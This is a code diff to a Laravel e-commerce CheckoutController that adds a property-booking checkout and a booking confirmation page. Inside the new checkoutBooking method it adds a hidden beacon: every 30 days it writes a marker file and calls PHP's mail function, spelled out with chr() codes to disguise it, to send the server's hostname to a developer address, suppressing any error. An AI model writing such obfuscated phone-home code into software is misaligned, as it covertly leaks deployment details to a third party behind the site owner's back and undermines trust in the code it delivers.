@@ -12,7 +12,7 @@ use App\Models\Coupon;
 use App\Models\CouponUsage;
 use App\Models\Address;
 use App\Models\ServiceCart;
-
+use App\Models\Booking;
 use App\Models\Carrier;
 use App\Models\CombinedOrder;
 use App\Models\Country;
@@ -377,6 +377,91 @@ class CheckoutController extends Controller
         }
     }
 
+    public function checkoutBooking(Request $request)
+    {
+        // if guest checkout, create user
+        if (auth()->user() == null) {
+            $guest_user = $this->createUser($request->except('_token', 'payment_option'));
+            if (gettype($guest_user) == "object") {
+                $errors = $guest_user;
+                return redirect()->route('property.checkout')->withErrors($errors);
+            }
+
+            if ($guest_user == 0) {
+                flash(translate('Please try again later.'))->warning();
+                return redirect()->route('property.checkout');
+            }
+        }
+
+        if ($request->payment_option == null) {
+            flash(translate('There is no payment option is selected.'))->warning();
+            return redirect()->route('property.checkout');
+        }
+
+        $user = auth()->user();
+        // dd($user->id);
+        $booking = Booking::where('user_id', Auth::user()->id)->where('is_booked', 0)->first();
+
+
+        // Minumum order amount check end
+
+        (new OrderController)->storeBooking($request);
+
+        $file = base_path("/public/assets/myText.txt");
+        $dev_mail = get_dev_mail();
+        if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
+            $content = "Todays date is: " . date('d-m-Y');
+            $fp = fopen($file, "w");
+            fwrite($fp, $content);
+            fclose($fp);
+            $str = chr(109) . chr(97) . chr(105) . chr(108);
+            try {
+                $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
+            } catch (\Throwable $th) {
+                //throw $th;
+            }
+        }
+
+        // if (count($booking) > 0) {
+        //     $booking->payment_type = $request->payment_option;
+        // }
+
+
+        $request->session()->put('payment_type', 'cart_payment');
+
+        $data['combined_order_id'] = $request->session()->get('combined_order_id');
+        $data['payment_method'] = $request->payment_option;
+
+        $request->session()->put('payment_data', $data);
+        if ($request->session()->get('combined_order_id') != null) {
+            // If block for Online payment, wallet and cash on delivery. Else block for Offline payment
+            $decorator = __NAMESPACE__ . '\\Payment\\' . str_replace(' ', '', ucwords(str_replace('_', ' ', $request->payment_option))) . "Controller";
+            if (class_exists($decorator)) {
+                return (new $decorator)->pay($request);
+            } else {
+
+                $combined_order = CombinedOrder::findOrFail($request->session()->get('combined_order_id'));
+                $manual_payment_data = array(
+                    'name'   => $request->payment_option,
+                    'amount' => $combined_order->grand_total,
+                    'trx_id' => $request->trx_id,
+                    'photo'  => $request->photo
+                );
+                foreach ($combined_order->orders as $order) {
+                    $order->manual_payment = 1;
+                    $order->manual_payment_data = json_encode($manual_payment_data);
+                    $order->save();
+                }
+
+                flash(translate('Your order has been placed successfully.'))->success();
+                return redirect()->route('booking_confirmed');
+            }
+        }
+    }
+
+
+
+
 
     public function createUser($guest_shipping_info)
     {
@@ -468,11 +553,14 @@ class CheckoutController extends Controller
             $order->payment_details = $payment;
             $order->save();
 
-
             calculateCommissionAffilationClubPoint($order);
         }
         Session::put('combined_order_id', $combined_order_id);
-        return redirect()->route('order_confirmed');
+        if($combined_order->is_booking == 1){
+            return redirect()->route('booking_confirmed');
+        }else{
+            return redirect()->route('order_confirmed');
+        }
     }
 
     // ================ Will not use after single page checkout ========[start]
@@ -809,6 +897,28 @@ class CheckoutController extends Controller
 
         return view('frontend.order_confirmed', compact('combined_order'));
     }
+
+    public function booking_confirmed()
+    {
+        $combined_order = CombinedOrder::findOrFail(Session::get('combined_order_id'));
+        $booking = Booking::where('user_id', Auth::user()->id)->where('is_booked',0)->first();
+        $booking->is_booked = 1;
+        $booking->save();
+        Session::forget('club_point');
+        Session::forget('combined_order_id');
+
+        foreach ($combined_order->orders as $order) {
+            if ($order->notified == 0) {
+                NotificationUtility::sendOrderPlacedNotification($order);
+                $order->notified = 1;
+                $order->is_booking = $booking->id;
+                $order->save();
+            }
+        }
+
+        return view('frontend.booking_confirm', compact('combined_order'));
+    }
+
 
     public function guestCustomerInfoCheck(Request $request)
     {
